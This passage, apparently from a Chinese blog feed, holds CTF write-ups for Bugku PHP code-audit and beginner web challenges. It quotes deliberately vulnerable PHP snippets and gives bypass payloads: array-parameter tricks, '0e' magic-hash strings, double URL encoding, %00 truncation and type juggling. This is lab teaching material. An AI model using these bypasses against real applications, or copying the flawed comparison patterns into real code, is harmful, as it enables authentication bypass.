print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div>

<p>知道p,q后，此题的解法与幼儿园的解法相同</p>
<p>菜鸡只会这么多。。。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>文件包含</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku代码审计</title>
    <url>/2020/09/14/decode/</url>
    <content><![CDATA[<h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><a id="more"></a>

<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag=<span class="hljs-string">'xxx'</span>;  <span class="hljs-comment">//新建变量</span>
extract($_GET);  <span class="hljs-comment">// 变量覆盖</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan))   <span class="hljs-comment">//判断是否存在</span>
&#123;
$content=trim(file_get_contents($flag));<span class="hljs-comment">//把文件读入字符串</span>
<span class="hljs-keyword">if</span>($shiyan==$content)  <span class="hljs-comment">//判断两变量是否相等</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">'flag&#123;xxx&#125;'</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">'Oh.no'</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>extract()函数</p>
<p><img src="https://i.loli.net/2020/11/28/z6p1eRwBdhAiJFK.png" srcset="/img/loading.gif" alt="extrct.png"></p>
<p><strong>isset()函数</strong><br>isset() 函数用于检测变量是否已设置并且非 NULL。</p>
<p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p>
<p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p>
<p>同时要注意的是 null 字符（”\0”）并不等同于 PHP 的 NULL 常量。</p>
<p>Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。</p>
<p>file_get_contents() </p>
<p><img src="https://i.loli.net/2020/11/28/2TUeHbzKjo3v9WL.png" srcset="/img/loading.gif" alt="file.png"></p>
<p>变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值</p>
<p>这里值得注意的是 <code>$shiyan</code>==<code>$content</code>,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同</p>
<p>可以用空值的方法使二者想等即</p>
<p><code>?shiyan=&amp;flag=</code></p>
<h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;
<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span>
<span class="hljs-comment">//比较两个字符串（区分大小写）</span>
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'No'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>题目给的注释很清楚的给出了获得flag的条件。。。</p>
<p>先了解一下</p>
<p><img src="https://i.loli.net/2020/11/28/HzFDTPCwtU1rkf2.png" srcset="/img/loading.gif" alt="strcmp.png"></p>
<p>strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  即可获得flag</p>
<p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p>
<h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>题目说的很清楚了，二次编码绕过</p>
<div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">"hackerDJ"</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;
<span class="hljs-built_in">echo</span>(<span class="hljs-string">"</span>
<span class="hljs-string"></span>
<span class="hljs-string">not allowed!</span>
<span class="hljs-string"></span>
<span class="hljs-string">"</span>);</code></pre></div>



<blockquote>
<p>PHP 函数 eregi()</p>
<p>语法<br> int eregi(string pattern, string string, [array regs]);<br> 定义和用法<br> eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。</p>
<p>可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p>
<p>返回值<br> 如果匹配成功返回true,否则,则返回false</p>
</blockquote>
<p>这里进行了过滤，传的值不能为hackerDJ</p>
<div class="hljs"><pre><code class="hljs php">
$_GET[id] = urldecode($_GET[id]);
<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"hackerDJ"</span>) <span class="hljs-comment">//要编码的字符串hackerDJ</span></code></pre></div>

<p>GET会提交时进行一次urlencode</p>
<p>urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。</p>
<p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecode后的<strong>$_GET[id]</strong> 复制给自己等于hackerDJ</p>
<p>所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag</p>
<p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>])) &#123;
<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'username'</span>] == $_GET[<span class="hljs-string">'password'</span>])
<span class="hljs-keyword">print</span> <span class="hljs-string">'Your password can not be your username.'</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'username'</span>]) === md5($_GET[<span class="hljs-string">'password'</span>]))
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid password'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>利用md5不能处理数组的特性绕过</p>
<p><a href="https://www.w3school.com.cn/php/func_string_md5.asp" target="_blank" rel="noopener">md5()</a></p>
<p>md5函数遇到数组类型的参数时，返回值为null，null===null,所以满足<code>md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]</code></p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
/?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div>



<h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag"</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>])) &#123;
<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//进行过滤，password必须包含字母和数字</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'--'</span>) !== <span class="hljs-keyword">FALSE</span>)
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>提示是数组返回NULL</p>
<p>直接尝试提交<code>?password[]=</code>，flag就出来了</p>
<p>了解一下原理，</p>
<blockquote>
<p>代码相关知识点链接如下：</p>
<p>isset函数：<a href="http://php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.isset.php</a></p>
<p>ereg函数：<a href="http://www.php.net/manual/zh/function.ereg.php" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.ereg.php</a></p>
<p>strpos函数：<a href="http://www.w3school.com.cn/php/func_string_strpos.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_strpos.asp</a></p>
<p>“[A-Za-z0-9]”<br>方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符</p>
<p>“^[A-Za-z0-9]$”<br>^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串</p>
<p>“^[A-Za-z0-9]+$”<br>+号表示重复1到多次，匹配由多个数字大小字母组成的字符串</p>
</blockquote>
<p><img src="https://i.loli.net/2020/11/28/2EjrzqhlvA4pcRg.png" srcset="/img/loading.gif" alt="ereg.png"></p>
<p><img src="https://i.loli.net/2020/11/28/yMSHUw8EcGd9izo.png" srcset="/img/loading.gif" alt="strpos.png"></p>
<p>值得注意的是这两个函数能处理的参数都是string类型</p>
<div class="hljs"><pre><code class="hljs php">ereg只能处理字符，r如果数组，则返回的是<span class="hljs-keyword">null</span>，三个等号的时候不会进行类型转换。所以<span class="hljs-keyword">null</span>不等于<span class="hljs-keyword">false</span>。

strpos的参数同样不能够是数组，所以返回的依旧是<span class="hljs-keyword">null</span>，<span class="hljs-keyword">null</span>不等于<span class="hljs-keyword">false</span>也是正确。</code></pre></div>

<p>故?password[]=可以绕过。</p>
<p>但是还有一种为%00截断</p>
<p><code>?password=d%00--</code></p>
<h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><div class="hljs"><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">'password'</span>];
is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no numeric"</span>):<span class="hljs-keyword">NULL</span>;
<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>)&#123;
<span class="hljs-keyword">echo</span> $flag;</code></pre></div>

<p>题目说了弱类型比较绕过</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">1444</span>b</code></pre></div>

<p>首先在is_numeric()检查时，因为1444b中包含了字母b所以不会认为是数字类型</p>
<p>在判断是否大于1336时，php默认1444b是数字类型，所以大于1336</p>
<h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>]))
&#123;
   var_dump($_GET[<span class="hljs-string">'name'</span>]);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">""</span>;
   var_dump($_GET[<span class="hljs-string">'password'</span>]);
   var_dump(sha1($_GET[<span class="hljs-string">'name'</span>]));
   var_dump(sha1($_GET[<span class="hljs-string">'password'</span>]));
    
   <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'name'</span>] == $_GET[<span class="hljs-string">'password'</span>])
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your password can not be your name!'</span>;
   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'name'</span>]) === sha1($_GET[<span class="hljs-string">'password'</span>]))
	    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
   <span class="hljs-keyword">else</span>
	    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password.'</span>;
&#125;
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'Login first!'</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>代码逻辑很简单，首先判断是否get方式传递name和password参数</p>
<p>var_dump，输出参数类型和值</p>
<p>之后如果通过if判断则可以拿到flag</p>
<p>if判断的条件</p>
<blockquote>
<p>name和password不能相同</p>
<p>但是sha1(name)===sha1(password)</p>
</blockquote>
<p>这里可以使用sha1函数无法处理数组的漏洞绕过，sha1遇到参数为数组类型时返回值为0</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div>



<h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
$a = @$_GET[<span class="hljs-string">'a'</span>];
$md52 = @md5($a);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag&#123;*&#125;"</span>;
&#125; 
<span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
&#125;
&#125;
<span class="hljs-keyword">else</span>
&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<div class="hljs"><pre><code class="hljs stylus">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a


<span class="hljs-comment">//下面是sha1()加密后 ==相等的字符串</span>
 sha1(str)
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaroZmOk'</span>)</span></span>  
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaK1STfY'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaO8zKZF'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aa3OFF9m'</span>)</span></span></code></pre></div>

<p>payload:</p>
<div class="hljs"><pre><code class="hljs routeros">GET:
?<span class="hljs-attribute">a</span>=240610708</code></pre></div>



<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>
<span class="hljs-function"></span>&#123;
$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
$one = ord(<span class="hljs-string">'1'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
$nine = ord(<span class="hljs-string">'9'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
$number = <span class="hljs-string">'3735929054'</span>;
<span class="hljs-comment">// Check all the input characters!</span>
<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)
&#123;
<span class="hljs-comment">// Disallow all the digits!</span>
$digit = ord($temp&#123;$i&#125;);
<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
&#123;
<span class="hljs-comment">// Aha, digit not allowed!</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;
&#125;
&#125;
<span class="hljs-keyword">if</span>($number == $temp)
<span class="hljs-keyword">return</span> $flag;
&#125;
$temp = $_GET[<span class="hljs-string">'password'</span>];
<span class="hljs-keyword">echo</span> noother_says_correct($temp);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>重点在这段代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
&#123;
<span class="hljs-comment">// Aha, digit not allowed!</span>
<span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;
&#125;
&#125;
<span class="hljs-keyword">if</span>($number == $temp)
<span class="hljs-keyword">return</span> $flag;
&#125;</code></pre></div>

<p>输入的数字中不能包含1-9的数字</p>
<p>如果输入的数字和相等则拿到flag</p>
<p>可以想到的是将这段数字转换为十六进制</p>
<div class="hljs"><pre><code class="hljs angelscript">hex(<span class="hljs-number">3735929054</span>)=<span class="hljs-number">0xdeadc0de</span>

GET:
password=<span class="hljs-number">0xdeadc0de</span></code></pre></div>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>网址打不开</p>
<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"xxx"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>]))
&#123;
	<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)
	&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;
	&#125;
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)
	&#123;
		<span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span>
		&#123;
			<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);
		&#125;
	<span class="hljs-keyword">else</span>
	&#123;
		<span class="hljs-keyword">echo</span>(<span class="hljs-string">'- have not been found'</span>);
	&#125;
&#125;
<span class="hljs-keyword">else</span>
&#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>绕过三个if语句即可拿到flag</p>
<p>第一个</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)</code></pre></div>

<p>这个比较常见的正则表达式，也很容易理解</p>
<p><code>[a-zA-Z0-9]+</code>包含大小写字符和数字，^是匹配开始标志，$是匹配结束标志</p>
<p>第二个</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)</code></pre></div>

<p>password字段长度小于8，但是大于9999999，可以使用科学计数法</p>
<p>第三个</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>)</code></pre></div>

<p>password要包含 <code>-</code>（做题的时候会发现应该是<code>*-*</code>）</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
password=<span class="hljs-number">1e9</span>%<span class="hljs-number">00</span>*-*</code></pre></div>

<p><img src="https://i.loli.net/2020/11/28/xcjep86YFtWgXMk.png" srcset="/img/loading.gif" alt="zhengze.png"></p>
<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'ctf'</span>])) &#123;
<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'ctf'</span>]) === <span class="hljs-keyword">FALSE</span>)
<span class="hljs-keyword">echo</span> <span class="hljs-string">'必须输入数字才行'</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'ctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'骚年，继续努力吧啊~'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>直接利用ereg和strpos函数不能处理数组的特性绕过</p>
<p>当输入ctf[]=11时，ereg返回值null!==FALSE</p>
<p>strpos返回值也为null!=FALSE</p>
<p>拿到flag</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
?ctf[]=<span class="hljs-number">111</span>
<span class="hljs-comment">//正常做法</span>
?nctf=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>%<span class="hljs-number">23</span>biubiubiu</code></pre></div>

<h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-string">"POST"</span> == $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>])
&#123;
$password = $_POST[<span class="hljs-string">'password'</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="hljs-comment">//preg_match — 执行一个正则表达式匹配 长度大于12</span>
&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag'</span>;<span class="hljs-comment">//这里输出的是假flag 真的在下面</span>
<span class="hljs-keyword">exit</span>;
&#125;
<span class="hljs-keyword">while</span> (<span class="hljs-keyword">TRUE</span>)
&#123;
$reg = <span class="hljs-string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))
<span class="hljs-keyword">break</span>;
$c = <span class="hljs-number">0</span>;
$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); 
  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)
&#123;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))
$c += <span class="hljs-number">1</span>;
&#125;
<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;
<span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span>
<span class="hljs-keyword">if</span> (<span class="hljs-string">"42"</span> == $password) <span class="hljs-keyword">echo</span> $flag;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Wrong password'</span>;
<span class="hljs-keyword">exit</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>代码还挺长，但是直接抓住重点</p>
<div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-number">0</span> &gt;= preg_match('/^[[<span class="hljs-symbol">:graph</span>:]]&#123;<span class="hljs-number">12</span>,&#125;$/', $password))</code></pre></div>

<p>[:graph]是所有可打印的字符,{12,},是在password中匹配12次以上，即password的长度大于12</p>
<p>下面的正则</p>
<div class="hljs"><pre><code class="hljs php">$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); 
  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)
&#123;
<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))
$c += <span class="hljs-number">1</span>;
&#125;</code></pre></div>

<p>要求password中必须包含三种以上的类型的字符，于是正常构造如下的payload</p>
<div class="hljs"><pre><code class="hljs angelscript">POST:
password=<span class="hljs-number">42</span>adad;d;;a

<span class="hljs-comment">//非正常的</span>
password=<span class="hljs-number">42</span>%<span class="hljs-number">00</span>
或者POST一个任意不等于password的字符
暂时不知道什么原因导致的</code></pre></div>

<p><img src="https://i.loli.net/2020/11/28/euJc6DPKCZ4a5bY.png" srcset="/img/loading.gif" alt="shuzi2.png"></p>
<p><img src="https://i.loli.net/2020/11/28/HwsChaXMRFWmjeA.png" srcset="/img/loading.gif" alt="shuzi1.png"></p>
<h2 id="简单waf"><a href="#简单waf" class="headerlink" title="简单waf"></a>简单waf</h2><p>网址打不开</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>变量覆盖</tag>
        <tag>函数漏洞</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku1-10</title>
    <url>/2020/09/06/bugku1-10/</url>
    <content><![CDATA[<h1 id="bugku刷题记录1"><a href="#bugku刷题记录1" class="headerlink" title="bugku刷题记录1"></a>bugku刷题记录1</h1><a id="more"></a>



<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>查看源码即可</p>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>修改前端代码</p>
<p><img src="https://i.loli.net/2020/11/30/YLlnyBHGibuWfdT.png" srcset="/img/loading.gif" alt></p>
<h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>payload:</p>
<p><code>?what=flag</code></p>
<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><div class="hljs"><pre><code class="hljs makefile"><span class="hljs-section">POST:</span>
what=flag</code></pre></div>

<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>payload: <code>?num=1a</code></p>
<p>考察点：弱类型比较</p>
<blockquote>
<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
</blockquote>
<p>测试代码</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
var_dump(<span class="hljs-string">"admin"</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"1admin"</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span>
var_dump(<span class="hljs-string">"admin1"</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span>
var_dump(<span class="hljs-string">"0e123456"</span>==<span class="hljs-string">"0e4456789"</span>); <span class="hljs-comment">//true</span>
<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//上述代码可自行测试</span></code></pre></div>

